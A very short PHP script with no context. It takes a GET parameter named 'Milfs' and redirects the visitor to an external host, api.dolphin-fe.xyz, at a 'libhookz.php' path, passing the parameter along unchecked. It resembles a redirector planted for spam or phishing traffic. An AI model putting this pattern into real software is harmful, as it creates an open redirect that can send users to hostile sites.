<?php
    $Tag = "Milfs";
    $Main_URL = "https://api.dolphin-fe.xyz/p/";

    if ($_GET[$Tag]) {
        $Img = $_GET[$Tag];
        header("Location: " . $Main_URL . "lib/libhookz.php?" . $Tag . "=" . $Img);
    }
?>
